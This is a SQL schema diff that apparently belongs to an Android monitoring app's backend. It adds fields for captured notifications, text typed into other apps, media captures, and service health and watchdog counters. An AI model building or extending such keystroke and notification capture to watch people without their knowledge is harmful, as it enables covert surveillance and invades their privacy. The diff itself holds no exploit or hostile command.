@@ -12,10 +12,22 @@ CREATE TABLE IF NOT EXISTS notifications (
     big_text     TEXT,
     sub_text     TEXT,
     sender_name  TEXT         NOT NULL DEFAULT '',
+    chat_body    TEXT,
     posted_at    TIMESTAMPTZ  NOT NULL,
     received_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
     dedup_hash   VARCHAR(64)  NOT NULL,
     image_url    TEXT,
+    image_source TEXT,
+    photo_intent BOOLEAN      NOT NULL DEFAULT FALSE,
+    related_notification_hash TEXT,
+    notification_key TEXT,
+    channel_id   TEXT,
+    category     TEXT,
+    group_key    TEXT,
+    sort_key     TEXT,
+    conversation_title TEXT,
+    flags        INTEGER      NOT NULL DEFAULT 0,
+    extras_json  TEXT,
     is_read      BOOLEAN      NOT NULL DEFAULT FALSE,
     is_archived  BOOLEAN      NOT NULL DEFAULT FALSE,
     -- Server-side deduplication: same device cannot post the same hash twice
@@ -37,6 +49,19 @@ CREATE TABLE IF NOT EXISTS typed_text (
     package_name VARCHAR(255) NOT NULL,
     app_label    VARCHAR(255) NOT NULL DEFAULT '',
     target_name  TEXT         NOT NULL DEFAULT '',
+    raw_package  TEXT         NOT NULL DEFAULT '',
+    raw_app_label TEXT        NOT NULL DEFAULT '',
+    resolved_package TEXT,
+    resolved_app_label TEXT,
+    attribution_source TEXT,
+    attribution_confidence REAL NOT NULL DEFAULT 0,
+    target_source TEXT,
+    class_name   TEXT,
+    view_id      TEXT,
+    hint_text    TEXT,
+    content_description TEXT,
+    input_type   INTEGER,
+    event_type   INTEGER,
     text         TEXT         NOT NULL,
     captured_at  TIMESTAMPTZ  NOT NULL,
     received_at  TIMESTAMPTZ  NOT NULL DEFAULT NOW()
@@ -78,6 +103,8 @@ CREATE TABLE IF NOT EXISTS media_captures (
     dedup_hash         VARCHAR(64)  NOT NULL,
     media_url          TEXT,
     thumbnail_urls     TEXT NOT NULL DEFAULT '[]',
+    related_notification_hash TEXT,
+    action             TEXT,
     CONSTRAINT uq_media_device_dedup UNIQUE (device_id, dedup_hash)
 );
 
@@ -88,6 +115,7 @@ CREATE INDEX IF NOT EXISTS idx_media_timeline ON media_captures (device_id, capt
 CREATE INDEX IF NOT EXISTS idx_media_device   ON media_captures (device_id);
 CREATE INDEX IF NOT EXISTS idx_media_package  ON media_captures (package_name);
 CREATE INDEX IF NOT EXISTS idx_media_source   ON media_captures (source);
+CREATE INDEX IF NOT EXISTS idx_media_related_notification ON media_captures (related_notification_hash);
 
 CREATE INDEX IF NOT EXISTS idx_favorites_device ON favorites (device_id, created_at DESC);
 
@@ -104,6 +132,27 @@ CREATE TABLE IF NOT EXISTS app_status (
     battery_exempt        BOOLEAN      NOT NULL DEFAULT FALSE,
     media_enabled         BOOLEAN      NOT NULL DEFAULT FALSE,
     all_files_access      BOOLEAN      NOT NULL DEFAULT FALSE,
+    listener_connected    BOOLEAN      NOT NULL DEFAULT FALSE,
+    foreground_service_running BOOLEAN NOT NULL DEFAULT FALSE,
+    watchdog_enabled      BOOLEAN      NOT NULL DEFAULT FALSE,
+    boot_time             TIMESTAMPTZ,
+    install_time          TIMESTAMPTZ,
+    update_time           TIMESTAMPTZ,
+    last_listener_event_at TIMESTAMPTZ,
+    typed_text_alive_at   TIMESTAMPTZ,
+    typed_text_last_event_at TIMESTAMPTZ,
+    typed_text_connected  BOOLEAN,
+    typed_service_bind_total BIGINT    NOT NULL DEFAULT 0,
+    typed_events_total    BIGINT       NOT NULL DEFAULT 0,
+    typed_text_sent_total BIGINT       NOT NULL DEFAULT 0,
+    typed_placeholder_rejected_total BIGINT NOT NULL DEFAULT 0,
+    typed_service_reconnect_total BIGINT NOT NULL DEFAULT 0,
+    watchdog_last_fired_at TIMESTAMPTZ,
+    notification_rebind_total BIGINT  NOT NULL DEFAULT 0,
+    listener_last_connected_at TIMESTAMPTZ,
+    listener_last_disconnected_at TIMESTAMPTZ,
+    notification_images_total BIGINT  NOT NULL DEFAULT 0,
+    notification_images_failed_total BIGINT NOT NULL DEFAULT 0,
     last_seen             TIMESTAMPTZ  NOT NULL DEFAULT NOW(),
     PRIMARY KEY (device_id, app_role)
 );
